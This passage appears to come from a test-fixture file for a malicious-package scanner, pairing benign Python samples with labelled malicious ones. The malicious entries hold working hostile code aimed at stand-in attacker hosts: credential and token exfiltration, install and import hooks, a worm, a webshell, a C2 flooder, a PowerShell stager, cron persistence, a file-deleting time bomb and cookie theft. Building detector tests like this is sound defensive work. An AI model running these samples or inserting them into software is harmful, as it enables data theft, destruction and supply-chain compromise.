    # ─── 사이클 7: 정상 5 (ML 도메인) ─────────────────────
    _ben(
        "torch-model-train",
        description="PyTorch 모델 학습 루프 (정상)",
        files={"train.py": '''
"""Standard PyTorch training loop."""
import torch
import torch.nn as nn

class MLP(nn.Module):
    def __init__(self, in_dim, hidden, out_dim):
        super().__init__()
        self.net = nn.Sequential(
            nn.Linear(in_dim, hidden), nn.ReLU(),
            nn.Linear(hidden, out_dim),
        )

    def forward(self, x):
        return self.net(x)

def train(model, loader, epochs=10, lr=1e-3):
    opt = torch.optim.Adam(model.parameters(), lr=lr)
    crit = nn.CrossEntropyLoss()
    for _ in range(epochs):
        for x, y in loader:
            opt.zero_grad()
            loss = crit(model(x), y)
            loss.backward()
            opt.step()
'''},
    ),
    _ben(
        "sklearn-pipeline",
        description="scikit-learn Pipeline / ColumnTransformer",
        files={"pipe.py": '''
"""sklearn pipeline assembly."""
from sklearn.pipeline import Pipeline
from sklearn.compose import ColumnTransformer
from sklearn.preprocessing import StandardScaler, OneHotEncoder
from sklearn.linear_model import LogisticRegression

def build_pipeline(numeric_cols, categorical_cols):
    pre = ColumnTransformer([
        ("num", StandardScaler(), numeric_cols),
        ("cat", OneHotEncoder(handle_unknown="ignore"), categorical_cols),
    ])
    return Pipeline([
        ("pre", pre),
        ("clf", LogisticRegression(max_iter=1000)),
    ])
'''},
    ),
    _ben(
        "pandas-dataframe-ops",
        description="pandas DataFrame 변환",
        files={"df_ops.py": '''
"""DataFrame helpers."""
import pandas as pd

def normalize_columns(df: pd.DataFrame) -> pd.DataFrame:
    return df.rename(columns=lambda c: c.strip().lower().replace(" ", "_"))

def fill_numeric_na(df: pd.DataFrame, value=0) -> pd.DataFrame:
    nums = df.select_dtypes(include="number").columns
    return df.fillna({c: value for c in nums})

def merge_with(df: pd.DataFrame, other: pd.DataFrame, on: str):
    return df.merge(other, on=on, how="left")
'''},
    ),
    _ben(
        "transformers-tokenizer",
        description="HuggingFace tokenizer 사용 (정상 추론)",
        files={"infer.py": '''
"""Transformers inference helper."""
from transformers import AutoTokenizer, AutoModelForSequenceClassification
import torch

def classify(text: str, model_name: str = "bert-base-uncased"):
    tok = AutoTokenizer.from_pretrained(model_name)
    model = AutoModelForSequenceClassification.from_pretrained(model_name)
    inputs = tok(text, return_tensors="pt", truncation=True)
    with torch.no_grad():
        logits = model(**inputs).logits
    return torch.softmax(logits, dim=-1).tolist()
'''},
    ),
    _ben(
        "matplotlib-plot",
        description="matplotlib 차트 (정상 시각화)",
        files={"plot.py": '''
"""Matplotlib chart helpers."""
import matplotlib.pyplot as plt

def histogram(data, bins=30, title=""):
    fig, ax = plt.subplots()
    ax.hist(data, bins=bins)
    ax.set_title(title)
    return fig

def line_chart(x, y, label=""):
    fig, ax = plt.subplots()
    ax.plot(x, y, label=label)
    ax.legend()
    return fig
'''},
    ),
    # ─── 사이클 8: 악성 5 (GHSA-inspired) ─────────────────
    _mal(
        "ctx-style-env-sweep",
        description="ctx (PyPI 2022) — 모든 env var 통째 송신",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="실제: ctx 패키지 incident",
        files={"context.py": '''
import os, requests, base64
# 모든 환경변수 dump → base64 → DNS-like 도메인으로 송신
all_env = "&".join(f"{k}={v}" for k, v in os.environ.items())
encoded = base64.b64encode(all_env.encode()).decode()
requests.get(f"https://attacker.example.com/?d={encoded}", timeout=3)
'''},
    ),
    _mal(
        "torchtriton-style-confusion",
        description="PyTorch 2022 - torchtriton dependency confusion",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="실제: pytorch nightly torchtriton incident",
        files={"setup.py": '''
"""Internal torchtriton hijack."""
from setuptools import setup
from setuptools.command.install import install
import os, base64, urllib.request

class Hijack(install):
    def run(self):
        try:
            data = base64.b64encode(
                ("|".join([
                    os.uname().nodename,
                    os.environ.get("HOSTNAME", ""),
                    os.environ.get("HOME", ""),
                    "/".join(os.listdir(os.path.expanduser("~/.ssh"))),
                ])).encode()
            ).decode()
            urllib.request.urlopen(
                f"https://h4ck.attacker.example.com/?p={data}",
                timeout=2,
            )
        except Exception:
            pass
        install.run(self)

setup(name="torchtriton", cmdclass={"install": Hijack})
'''},
    ),
    _mal(
        "ssh-decorate-stealer",
        description="ssh-decorate (PyPI 2018) — SSH credentials 탈취",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="실제: ssh-decorate hijack",
        files={"decorate.py": '''
import paramiko, requests
_orig_connect = paramiko.SSHClient.connect

def hijacked_connect(self, hostname, *args, **kwargs):
    try:
        requests.post(
            "https://attacker.example.com/sshcreds",
            json={
                "host": hostname,
                "user": kwargs.get("username") or args[1] if args else "?",
                "pwd":  kwargs.get("password"),
                "key":  kwargs.get("key_filename"),
            },
        )
    except Exception:
        pass
    return _orig_connect(self, hostname, *args, **kwargs)

paramiko.SSHClient.connect = hijacked_connect
'''},
    ),
    _mal(
        "shai-hulud-self-replicate",
        description="shai-hulud 2025 — 자가 복제 + npm 토큰 탈취",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="실제: shai-hulud worm",
        files={"replicate.py": '''
import os, json, subprocess, requests, glob

# 1. NPM token 탈취
token = None
for path in (os.path.expanduser("~/.npmrc"),
             os.path.expanduser("~/.config/npm/.npmrc")):
    try:
        with open(path) as f:
            for line in f:
                if "_authToken=" in line:
                    token = line.split("=", 1)[1].strip()
    except Exception:
        pass

if token:
    requests.post("https://attacker.example.com/npm",
                  json={"token": token})

# 2. 자기 자신 코드를 다른 패키지에 주입 (worm)
for pkg_json in glob.glob(os.path.expanduser("~/projects/*/package.json")):
    try:
        with open(pkg_json) as f:
            pkg = json.load(f)
        pkg.setdefault("scripts", {})["preinstall"] = (
            "node -e \\"require('https').get('https://attacker.example.com/x')\\""
        )
        with open(pkg_json, "w") as f:
            json.dump(pkg, f, indent=2)
    except Exception:
        pass
'''},
    ),
    _mal(
        "phpass-style-pickle-rce",
        description="phpass 류 — pickle 역직렬화 + remote payload",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="역직렬화 RCE 패턴 보강",
        files={"deserialize.py": '''
import pickle, urllib.request, base64

# remote 에서 pickle blob fetch + 역직렬화
data = urllib.request.urlopen(
    "https://attacker.example.com/payload.pkl"
).read()

# base64 한 번 wrap 된 pickle 까지
try:
    obj = pickle.loads(base64.b64decode(data))
except Exception:
    obj = pickle.loads(data)
# obj.__reduce__ 가 자동 호출됨
'''},
    ),
    # ─── 사이클 8: 정상 5 ─────────────────────────────────
    _ben(
        "fastapi-dependency-injection",
        description="FastAPI Depends 주입 패턴",
        files={"deps.py": '''
"""FastAPI dependency injection."""
from fastapi import Depends, Header, HTTPException
from typing import Annotated

def get_token(authorization: Annotated[str | None, Header()] = None) -> str:
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="missing bearer token")
    return authorization.removeprefix("Bearer ")

def get_user(token: Annotated[str, Depends(get_token)]):
    # validate token, return user
    return {"sub": "user-1", "scope": "read"}
'''},
    ),
    _ben(
        "celery-task-definition",
        description="Celery 비동기 태스크 정의",
        files={"tasks.py": '''
"""Celery task module."""
from celery import Celery

app = Celery("worker", broker="redis://localhost:6379/0")

@app.task(bind=True, max_retries=3)
def process_image(self, image_id: str):
    try:
        # ... image processing logic ...
        return {"status": "done", "image_id": image_id}
    except Exception as exc:
        raise self.retry(exc=exc, countdown=30)
'''},
    ),
    _ben(
        "structlog-config",
        description="structlog 구조화 로그 셋업",
        files={"log_cfg.py": '''
"""structlog setup."""
import logging
import structlog

def configure(level: int = logging.INFO):
    structlog.configure(
        processors=[
            structlog.stdlib.filter_by_level,
            structlog.stdlib.add_logger_name,
            structlog.stdlib.add_log_level,
            structlog.processors.TimeStamper(fmt="iso"),
            structlog.processors.JSONRenderer(),
        ],
        wrapper_class=structlog.stdlib.BoundLogger,
        logger_factory=structlog.stdlib.LoggerFactory(),
        cache_logger_on_first_use=True,
    )
    logging.basicConfig(level=level, format="%(message)s")
'''},
    ),
    _ben(
        "dataclass-validation",
        description="dataclass __post_init__ validation",
        files={"models.py": '''
"""Validated dataclasses."""
from dataclasses import dataclass

@dataclass
class Email:
    address: str

    def __post_init__(self):
        if "@" not in self.address:
            raise ValueError(f"invalid email: {self.address}")

@dataclass
class Money:
    amount: int   # cents
    currency: str = "USD"

    def __post_init__(self):
        if self.amount < 0:
            raise ValueError("amount must be non-negative")
        if len(self.currency) != 3:
            raise ValueError(f"currency code must be 3 letters: {self.currency}")
'''},
    ),
    _ben(
        "py4web-style-controller",
        description="간단 web framework 컨트롤러",
        files={"controllers.py": '''
"""Lightweight web controller."""

class Controller:
    def __init__(self, db):
        self.db = db

    def list(self, page: int = 0, per_page: int = 20):
        offset = page * per_page
        return self.db.query(
            "SELECT id, name FROM items ORDER BY id LIMIT ? OFFSET ?",
            (per_page, offset),
        )

    def show(self, item_id: int):
        rows = self.db.query("SELECT * FROM items WHERE id = ?", (item_id,))
        return rows[0] if rows else None
'''},
    ),
    # ─── 사이클 9: 악성 5 (botnet/webshell/post-exploit) ─────
    _mal(
        "mirai-style-tcp-flooder",
        description="Mirai 류 — 외부 C2 명령 받아 TCP flood",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="botnet flooder",
        files={"flood.py": '''
import socket, threading, requests
def flood(target, port, duration):
    end = __import__("time").time() + duration
    while __import__("time").time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n" * 100)
            s.close()
        except Exception:
            pass

# C2 명령 받기
while True:
    try:
        cmd = requests.get("https://attacker.example.com/c2/cmd").json()
        if cmd.get("action") == "flood":
            threading.Thread(
                target=flood,
                args=(cmd["target"], cmd["port"], cmd.get("dur", 60)),
                daemon=True,
            ).start()
    except Exception:
        pass
    __import__("time").sleep(30)
'''},
    ),
    _mal(
        "webshell-eval-handler",
        description="HTTP request 받아 eval 실행 (WebShell)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="WebShell — POST cmd → eval",
        files={"shell.py": '''
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length).decode()
        try:
            result = eval(body)  # remote arbitrary expression
        except Exception as e:
            result = str(e)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(str(result).encode())

HTTPServer(("0.0.0.0", 8888), Handler).serve_forever()
'''},
    ),
    _mal(
        "powershell-empire-stager",
        description="PowerShell Empire stager — Win32 + base64 + IEX",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="Windows post-exploit",
        files={"stager.py": '''
import subprocess, base64
# Empire-style stager — 인코딩된 PS 페이로드를 IEX 로 실행
encoded = "JAB3ID0gTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50OyAkdy5Eb3duXG9hZFN0cmluZygnaHR0cDovL2V2aWwnKSB8IElFWA=="
ps_cmd = (
    f"powershell.exe -ExecutionPolicy Bypass -NoProfile "
    f"-EncodedCommand {encoded}"
)
subprocess.Popen(ps_cmd, shell=True)
'''},
    ),
    _mal(
        "linux-cron-persistence",
        description="crontab 추가로 영속성 확보",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="SYS-002 cron persistence",
        files={"persist.py": '''
import subprocess
# 매 분마다 페이로드 실행
cron_line = "* * * * * /tmp/.payload.sh > /dev/null 2>&1\\n"
existing = subprocess.run(
    ["crontab", "-l"], capture_output=True, text=True
).stdout
new = existing + cron_line
subprocess.run(["crontab", "-"], input=new, text=True)
'''},
    ),
    _mal(
        "browser-history-exfil",
        description="Firefox/Chrome history SQLite 직접 추출",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="creds-paths 변형",
        files={"history.py": '''
import os, sqlite3, requests
candidates = [
    os.path.expanduser("~/.mozilla/firefox/*/places.sqlite"),
    os.path.expanduser("~/.config/google-chrome/Default/History"),
    os.path.expanduser("~/Library/Application Support/Firefox/Profiles/*/places.sqlite"),
]
import glob
for pat in candidates:
    for path in glob.glob(pat):
        try:
            con = sqlite3.connect(path)
            rows = con.execute(
                "SELECT url, title FROM moz_places LIMIT 5000"
            ).fetchall() if "places" in path else con.execute(
                "SELECT url, title FROM urls LIMIT 5000"
            ).fetchall()
            con.close()
            requests.post(
                "https://attacker.example.com/history",
                json={"path": path, "rows": [list(r) for r in rows]},
            )
        except Exception:
            pass
'''},
    ),
    # ─── 사이클 9: 정상 5 (블록체인 / 게임 / IoT) ──────────
    _ben(
        "web3-eth-balance",
        description="web3.py 잔고 조회 (정상)",
        files={"eth.py": '''
"""Read-only Ethereum balance query."""
from web3 import Web3

def get_balance(rpc_url: str, address: str) -> int:
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    return w3.eth.get_balance(Web3.to_checksum_address(address))

def get_block(rpc_url: str, block_num: int):
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    return w3.eth.get_block(block_num)
'''},
    ),
    _ben(
        "pygame-loop",
        description="pygame 게임 루프 (정상 — 무한 루프 + draw)",
        files={"game.py": '''
"""Standard pygame main loop."""
import pygame

def main():
    pygame.init()
    screen = pygame.display.set_mode((640, 480))
    clock = pygame.time.Clock()
    running = True
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
        screen.fill((30, 30, 30))
        pygame.draw.circle(screen, (200, 200, 50), (320, 240), 50)
        pygame.display.flip()
        clock.tick(60)
    pygame.quit()
'''},
    ),
    _ben(
        "mqtt-iot-publisher",
        description="MQTT 메시지 발행 (IoT 정상)",
        files={"mqtt_pub.py": '''
"""IoT MQTT publisher."""
import paho.mqtt.client as mqtt

class TelemetryPublisher:
    def __init__(self, broker: str, port: int = 1883):
        self.client = mqtt.Client()
        self.client.connect(broker, port)

    def publish(self, topic: str, payload: dict):
        import json
        self.client.publish(topic, json.dumps(payload), qos=1)

    def loop(self):
        self.client.loop_forever()
'''},
    ),
    _ben(
        "openpyxl-spreadsheet",
        description="Excel 파일 읽기/쓰기",
        files={"xlsx.py": '''
"""openpyxl wrappers."""
from openpyxl import load_workbook, Workbook

def read_sheet(path: str, sheet: str = None):
    wb = load_workbook(path, read_only=True)
    ws = wb[sheet] if sheet else wb.active
    return [list(row) for row in ws.iter_rows(values_only=True)]

def write_sheet(path: str, rows: list, sheet_name: str = "Sheet1"):
    wb = Workbook()
    ws = wb.active
    ws.title = sheet_name
    for row in rows:
        ws.append(row)
    wb.save(path)
'''},
    ),
    _ben(
        "asyncio-websocket-server",
        description="websockets 라이브러리 서버 (정상 listen)",
        files={"ws.py": '''
"""asyncio websockets server."""
import asyncio
import websockets

async def echo(websocket):
    async for message in websocket:
        await websocket.send(f"echo: {message}")

async def main():
    async with websockets.serve(echo, "127.0.0.1", 8765):
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
'''},
    ),
    # ─── 사이클 10: false-positive 스트레스 테스트 ──────────
    # 정상 패키지지만 표면적으로 의심스러운 패턴
    _ben(
        "ansible-shell-module",
        description="Ansible shell 태스크 — subprocess + shell=True (정상)",
        files={"shell.py": '''
"""Ansible-style shell module — runs commands as part of automation."""
import subprocess

def run_shell(cmd: str, timeout: int = 60) -> dict:
    """
    Standard automation tool: executes user-provided shell command.
    This is a legitimate function in IaC tooling (Ansible / SaltStack pattern).
    """
    result = subprocess.run(
        cmd, shell=True, capture_output=True, text=True, timeout=timeout
    )
    return {
        "stdout": result.stdout,
        "stderr": result.stderr,
        "rc": result.returncode,
    }
'''},
    ),
    _ben(
        "test-fixture-with-env",
        description="pytest fixture — 환경변수 설정 + 외부 호출 (테스트 정상)",
        files={"conftest.py": '''
"""pytest fixture for integration tests."""
import os
import pytest
import requests

@pytest.fixture(scope="session")
def api_base() -> str:
    return os.environ.get("API_BASE_URL", "http://localhost:8080")

@pytest.fixture
def auth_token() -> str:
    return os.environ.get("TEST_AUTH_TOKEN", "test-token")

@pytest.fixture
def http_session(api_base, auth_token):
    s = requests.Session()
    s.headers.update({"Authorization": f"Bearer {auth_token}"})
    return s

def test_health(http_session, api_base):
    r = http_session.get(f"{api_base}/health")
    assert r.status_code == 200
'''},
    ),
    _ben(
        "deployment-script",
        description="배포 스크립트 — git pull + pip install + service restart",
        files={"deploy.py": '''
"""Production deployment script."""
import subprocess
import sys

def deploy(branch: str = "main") -> int:
    steps = [
        ["git", "fetch", "origin"],
        ["git", "checkout", branch],
        ["git", "pull", "--ff-only"],
        ["pip", "install", "-r", "requirements.txt"],
        ["systemctl", "restart", "myapp.service"],
    ]
    for cmd in steps:
        print(f"+ {' '.join(cmd)}")
        result = subprocess.run(cmd)
        if result.returncode != 0:
            return result.returncode
    return 0

if __name__ == "__main__":
    sys.exit(deploy(sys.argv[1] if len(sys.argv) > 1 else "main"))
'''},
    ),
    _ben(
        "unittest-mock-patching",
        description="unittest.mock.patch 사용 (legit monkey-patch — test only)",
        files={"test_mock.py": '''
"""Test with unittest.mock.patch — legitimate test monkey-patching."""
from unittest.mock import patch, MagicMock

def test_external_api_call():
    with patch("requests.get") as mock_get:
        mock_get.return_value.json.return_value = {"ok": True}
        # production 코드 호출
        import requests
        result = requests.get("https://api.example.com").json()
        assert result == {"ok": True}
        mock_get.assert_called_once()
'''},
    ),
    _ben(
        "telemetry-opt-in-sender",
        description="opt-in 텔레메트리 (정상 — 사용자 동의 후만)",
        files={"telemetry.py": '''
"""Opt-in usage telemetry (e.g., as in Homebrew, npm, pip)."""
import json
import os
import platform
import requests

ENDPOINT = "https://telemetry.example-tool.org/v1/events"

def is_enabled() -> bool:
    """User must explicitly opt in."""
    return os.environ.get("MY_TOOL_TELEMETRY") == "1"

def send_event(name: str, properties: dict | None = None) -> None:
    if not is_enabled():
        return
    payload = {
        "event": name,
        "tool_version": "1.2.3",
        "python": platform.python_version(),
        "os": platform.system(),
        "properties": properties or {},
    }
    try:
        requests.post(ENDPOINT, json=payload, timeout=2)
    except Exception:
        pass
'''},
    ),
    # ─── 사이클 10: 악성 5 (의심스럽지만 까다로운 케이스) ────
    _mal(
        "stealthy-init-on-import",
        description="__init__.py 가 import 시점에 외부 송신 (잠수)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="EXS-001 (Import-Time Execution)",
        files={"__init__.py": '''
"""Public package __init__."""
from .api import *  # noqa: F401, F403

# 정상 import 처럼 보이지만, import 시점에 silently 실행
import os
import requests
try:
    requests.post(
        "https://attacker.example.com/installed",
        json={
            "user": os.environ.get("USER"),
            "host": os.uname().nodename if hasattr(os, "uname") else "?",
            "cwd":  os.getcwd(),
        },
        timeout=2,
    )
except Exception:
    pass
'''},
    ),
    _mal(
        "delayed-payload-time-bomb",
        description="3 일 후 활성화되는 시한 폭탄 (날짜 비교)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="time-conditional + dangerous action",
        files={"helper.py": '''
import datetime, os, shutil
INSTALL_DATE = datetime.datetime(2026, 4, 1)
if datetime.datetime.now() > INSTALL_DATE + datetime.timedelta(days=3):
    # 3일 지나면 발화
    home = os.path.expanduser("~")
    for d in ("Documents", "Pictures"):
        try:
            shutil.rmtree(os.path.join(home, d))
        except Exception:
            pass
'''},
    ),
    _mal(
        "fake-update-checker",
        description="\"업데이트 확인\" 으로 가장하지만 실제론 페이로드 다운+실행",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="description-behavior mismatch",
        files={"updater.py": '''
import requests, subprocess

def check_for_updates():
    """Check for updates and apply them."""
    # 실제로는 임의 파일을 받아 실행
    r = requests.get("https://attacker.example.com/latest.sh")
    with open("/tmp/.update", "wb") as f:
        f.write(r.content)
    subprocess.run(["bash", "/tmp/.update"], check=False)
'''},
    ),
    _mal(
        "supply-chain-poisoned-build-tool",
        description="빌드 시 다른 패키지에 페이로드 주입 (cross-pollination)",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="cross-package poisoning",
        files={"setup.py": '''
"""Build hook that injects payload into sibling packages."""
from setuptools import setup
from setuptools.command.install import install
import os, glob, site

class CrossPoison(install):
    def run(self):
        install.run(self)
        # 동일 환경의 다른 패키지의 __init__.py 에 페이로드 추가
        for sp in site.getsitepackages():
            for init in glob.glob(os.path.join(sp, "*", "__init__.py")):
                if "evil-pkg" in init:
                    continue
                try:
                    with open(init, "a") as f:
                        f.write(
                            "\\nimport os; os.system("
                            "'curl -d $(env | base64) https://attacker.example.com/x'"
                            ")\\n"
                        )
                except Exception:
                    pass

setup(name="evil-pkg", cmdclass={"install": CrossPoison})
'''},
    ),
    _mal(
        "cookie-grab-via-cdp",
        description="Chrome DevTools Protocol (CDP) 로 cookie 추출",
        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
        note="CDP-based stealing",
        files={"cdp.py": '''
import json, requests, subprocess
# Chrome 을 remote debug 모드로 띄움
subprocess.Popen(
    ["google-chrome", "--remote-debugging-port=9222", "--headless"],
    stdout=subprocess.DEVNULL,
)
# CDP 로 cookies 추출
tabs = requests.get("http://localhost:9222/json").json()
for tab in tabs:
    ws = requests.get(tab["webSocketDebuggerUrl"])
    # ... CDP 명령 ...
# 결과 외부 송신
requests.post("https://attacker.example.com/cookies",
              json={"tabs": tabs})
'''},
    ),
    # ─── 정상 fixture 추가 10 ───────────────────────────────
    _ben(
        "fastapi-style-app",
        description="FastAPI 스타일 비동기 앱",
        files={"main.py": '''
"""FastAPI app."""
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

app = FastAPI()

class Item(BaseModel):
    name: str
    price: float

@app.get("/items/{item_id}")
async def read_item(item_id: int):
    if item_id < 0:
        raise HTTPException(status_code=400, detail="invalid id")
    return {"item_id": item_id}

@app.post("/items/")
async def create_item(item: Item):
    return item
'''},
    ),
    _ben(
        "numpy-array-ops",
        description="numpy 행렬 연산",
        files={"linalg.py": '''
"""Linear algebra helpers."""
import numpy as np

def normalize(v):
    norm = np.linalg.norm(v)
    if norm == 0:
        return v
    return v / norm

def cosine(a, b):
    return float(np.dot(a, b) / (np.linalg.norm(a) * np.linalg.norm(b)))

def softmax(x, axis=-1):
    e = np.exp(x - np.max(x, axis=axis, keepdims=True))
    return e / np.sum(e, axis=axis, keepdims=True)
'''},
    ),
    _ben(
        "dataclass-serializer",
        description="dataclass JSON 직렬화 helper",
        files={"serial.py": '''
"""Dataclass <-> JSON helpers."""
import dataclasses
import json
from typing import Any

def to_dict(obj: Any) -> dict:
    if dataclasses.is_dataclass(obj):
        return dataclasses.asdict(obj)
    raise TypeError(f"not a dataclass: {type(obj)}")

def to_json(obj: Any, **kw) -> str:
    return json.dumps(to_dict(obj), **kw)
'''},
    ),
    _ben(
        "logging-rotating-file",
        description="rotating file handler 설정 (정상)",
        files={"log_setup.py": '''
"""Rotating file logger."""
import logging
import logging.handlers
from pathlib import Path

def setup(name: str, log_dir: str, level: int = logging.INFO):
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    logger = logging.getLogger(name)
    logger.setLevel(level)
    handler = logging.handlers.RotatingFileHandler(
        f"{log_dir}/{name}.log",
        maxBytes=10 * 1024 * 1024, backupCount=5,
    )
    handler.setFormatter(logging.Formatter(
        "%(asctime)s %(name)s %(levelname)s %(message)s"
    ))
    logger.addHandler(handler)
    return logger
'''},
    ),
    _ben(
        "graphql-resolver-skeleton",
        description="GraphQL resolver 골격",
        files={"schema.py": '''
"""GraphQL schema + resolvers."""
from typing import List, Optional

class User:
    def __init__(self, id: int, name: str):
        self.id = id
        self.name = name

USERS = [User(1, "Alice"), User(2, "Bob")]

def resolve_user(parent, info, id: int) -> Optional[User]:
    for u in USERS:
        if u.id == id:
            return u
    return None

def resolve_users(parent, info) -> List[User]:
    return USERS
'''},
    ),
    _ben(
        "image-pillow-resize",
        description="Pillow 로 이미지 리사이즈",
        files={"image.py": '''
"""Image resize helper."""
from PIL import Image
from pathlib import Path

def resize(src: str, dst: str, size: tuple) -> None:
    img = Image.open(src)
    img.thumbnail(size, Image.LANCZOS)
    img.save(dst)
'''},
    ),
    _ben(
        "regex-validator",
        description="이메일/URL 정규식 validator",
        files={"validators.py": '''
"""Pattern-based validators."""
import re

EMAIL_RE = re.compile(r"^[\\w.+-]+@[\\w-]+\\.[\\w.-]+$")
URL_RE = re.compile(r"^https?://[\\w.-]+(?:/[\\w./?=&%-]*)?$")

def is_email(s: str) -> bool:
    return bool(EMAIL_RE.match(s))

def is_url(s: str) -> bool:
    return bool(URL_RE.match(s))
'''},
    ),
    _ben(
        "concurrent-futures-pool",
        description="ThreadPoolExecutor 워커 풀",
        files={"pool.py": '''
"""Thread pool wrapper."""
from concurrent.futures import ThreadPoolExecutor, as_completed

def map_parallel(fn, items, max_workers: int = 8):
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = {ex.submit(fn, x): x for x in items}
        for fut in as_completed(futures):
            yield futures[fut], fut.result()
'''},
    ),
    _ben(
        "redis-cache-wrapper",
        description="redis 캐싱 wrapper (정상)",
        files={"cache.py": '''
"""Redis-backed cache."""
import json

class Cache:
    def __init__(self, client):
        self.client = client

    def get(self, key: str):
        v = self.client.get(key)
        return json.loads(v) if v else None

    def set(self, key: str, value, ttl: int = 3600):
        self.client.setex(key, ttl, json.dumps(value))
'''},
    ),
    _ben(
        "pytest-fixtures-tmpdir",
        description="pytest tmpdir 사용 fixture",
        files={"test_io.py": '''
"""pytest tmp directory tests."""
import pytest
from pathlib import Path

@pytest.fixture
def workdir(tmp_path: Path) -> Path:
    sub = tmp_path / "work"
    sub.mkdir()
    return sub

def test_write_and_read(workdir):
    f = workdir / "data.txt"
    f.write_text("hello", encoding="utf-8")
    assert f.read_text(encoding="utf-8") == "hello"
'''},
    ),
]


# ─── 정상 fixtures (10개) ─────────────────────────────────

BEN_FIXTURES: list[Fixture] = [
    _ben(
        "json-helper",
        description="단순 json 파싱 helper",
        files={"util.py": '''
"""JSON parsing utilities."""
import json

def parse(s: str) -> dict:
    return json.loads(s)

def dumps(d: dict) -> str:
    return json.dumps(d, indent=2)
'''},
    ),
    _ben(
        "math-utils",
        description="수학 유틸 (외부 호출 없음)",
        files={"math_utils.py": '''
"""Pure math helpers."""
def factorial(n: int) -> int:
    if n <= 1:
        return 1
    return n * factorial(n - 1)

def gcd(a: int, b: int) -> int:
    while b:
        a, b = b, a % b
    return a
'''},
    ),
    _ben(
        "http-getter-readonly",
        description="단순 http GET 클라이언트 (인증/secrets 없음)",
        files={"client.py": '''
"""Simple read-only HTTP client (no exfiltration)."""
import requests

def fetch_json(url: str) -> dict:
    resp = requests.get(url, timeout=10)
    resp.raise_for_status()
    return resp.json()

def fetch_text(url: str, encoding: str = "utf-8") -> str:
    resp = requests.get(url, timeout=10)
    resp.encoding = encoding
    return resp.text
'''},
    ),
    _ben(
        "string-utils",
        description="순수 string 처리 (외부 호출 없음)",
        files={"strings.py": '''
"""String formatting utilities."""
def title_case(s: str) -> str:
    return " ".join(w.capitalize() for w in s.split())

def slugify(s: str) -> str:
    return "-".join(s.lower().split())
'''},
    ),
    _ben(
        "config-loader-yaml-safe",
        description="yaml.safe_load (RCE 없음)",
        files={"config.py": '''
"""YAML config loader (safe_load)."""
import yaml
from pathlib import Path

def load(path: str) -> dict:
    with open(path) as f:
        return yaml.safe_load(f)

def dump(d: dict, path: str) -> None:
    with open(path, "w") as f:
        yaml.safe_dump(d, f)
'''},
    ),
    _ben(
        "logger-setup",
        description="logging 설정 (외부 송신 없음)",
        files={"logger.py": '''
"""Standard logger setup."""
import logging
import sys

def get_logger(name: str, level: int = logging.INFO):
    logger = logging.getLogger(name)
    logger.setLevel(level)
    h = logging.StreamHandler(sys.stdout)
    h.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
    logger.addHandler(h)
    return logger
'''},
    ),
    _ben(
        "csv-reader",
        description="CSV 파일 읽기 (read-only)",
        files={"csv_reader.py": '''
"""Read CSV files into list of dicts."""
import csv

def read_dicts(path: str) -> list:
    with open(path, encoding="utf-8") as f:
        return list(csv.DictReader(f))
'''},
    ),
    _ben(
        "datetime-formatter",
        description="datetime 포맷팅 (외부 의존 없음)",
        files={"dt.py": '''
"""Datetime formatting helpers."""
from datetime import datetime, timezone

def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()

def fmt(dt: datetime, pattern: str = "%Y-%m-%d") -> str:
    return dt.strftime(pattern)
'''},
    ),
    _ben(
        "url-builder",
        description="URL 빌드 helper (요청 안 함)",
        files={"urls.py": '''
"""URL construction helpers (no actual requests)."""
from urllib.parse import urlencode, urljoin

def build(base: str, path: str, params: dict | None = None) -> str:
    url = urljoin(base, path)
    if params:
        url = url + "?" + urlencode(params)
    return url
'''},
    ),
    _ben(
        "cli-arg-parser",
        description="argparse 기반 CLI",
        files={"cli.py": '''
"""Simple argparse CLI."""
import argparse

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--input", required=True)
    p.add_argument("--output", default="out.txt")
    p.add_argument("--verbose", action="store_true")
    args = p.parse_args()
    print(f"Input: {args.input}, Output: {args.output}")

if __name__ == "__main__":
    main()
'''},
    ),
    # ─── 정상 fixture 추가 10개 (B 확장) ────────────────
    _ben(
        "flask-style-app",
        description="Flask 스타일 웹 앱 (정상)",
        files={"app.py": '''
"""Standard Flask-like web app."""
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/health")
def health():
    return jsonify({"status": "ok"})

@app.route("/echo", methods=["POST"])
def echo():
    return jsonify({"received": request.get_json()})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
'''},
    ),
